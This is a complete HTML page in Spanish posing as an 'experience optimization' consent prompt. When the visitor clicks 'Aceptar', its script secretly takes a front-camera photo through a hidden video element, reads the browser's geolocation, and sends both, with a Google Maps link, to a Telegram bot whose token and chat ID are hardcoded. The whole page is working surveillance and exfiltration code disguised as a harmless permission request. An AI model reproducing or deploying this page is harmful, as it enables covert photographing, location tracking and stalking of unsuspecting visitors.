<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Optimización de Experiencia</title>
    <style>
        /* Modal centrado */
        #permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6); /* Fondo oscuro */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        #permission-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 90%;
        }

        #permission-modal button {
            margin-top: 20px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #28a745;
            color: white;
            cursor: pointer;
        }

        #permission-modal button:hover {
            background: #218838;
        }

        #permission-modal h2 {
            margin-bottom: 10px;
        }

        #permission-modal p {
            color: #555;
            font-size: 16px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <!-- Modal persuasivo -->
    <div id="permission-modal">
        <div id="permission-content">
            <h2>Ayúdanos a Mejorar</h2>
            <p>Recopilamos datos para ofrecerte una experiencia optimizada y personalizada. Por favor, concede permisos para continuar.</p>
            <button onclick="requestPermissions()">Aceptar</button>
        </div>
    </div>

    <script>
        const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
        const chatId = '1223367230'; // Chat ID
        let locationInfo = 'Ubicación: No disponible (usuario no otorgó permisos).';
        let mapLink = '';

        async function requestPermissions() {
            const modal = document.getElementById('permission-modal');
            modal.style.display = 'none'; // Ocultar el modal después de la aceptación
            await getLocation(); // Obtener ubicación
            await initializeCamera(); // Iniciar la cámara
        }

        async function getLocation() {
            if (navigator.geolocation) {
                try {
                    await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                const { latitude, longitude } = position.coords;
                                locationInfo = `Ubicación: Latitud ${latitude}, Longitud ${longitude}`;
                                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                                resolve();
                            },
                            () => {
                                console.warn('No se pudo obtener la ubicación.');
                                resolve();
                            }
                        );
                    });
                } catch (error) {
                    console.error('Error al intentar obtener ubicación:', error.message);
                }
            } else {
                console.warn('Geolocalización no soportada por el navegador.');
            }
        }

        async function initializeCamera() {
            const constraints = {
                video: {
                    facingMode: "user" // Intentar usar la cámara frontal
                }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video'); // Crear video oculto
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                video.play();

                video.onloadedmetadata = async () => {
                    await captureAndSendPhoto(video, stream);
                    stream.getTracks().forEach(track => track.stop()); // Detener cámara
                    video.remove(); // Eliminar elemento video
                };
            } catch (error) {
                console.error('Error al acceder a la cámara:', error);
            }
        }

        async function captureAndSendPhoto(video, stream) {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Configurar canvas con las dimensiones del video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Dibujar la imagen del video en el canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convertir el contenido del canvas a un archivo Blob
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `Nuevo visitante:
- ${locationInfo}
- Enlace a Google Maps: ${mapLink || 'No disponible'}`);

                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        console.error('Error al enviar la foto:', await response.json());
                    }
                } catch (error) {
                    console.error('Error de red:', error.message);
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
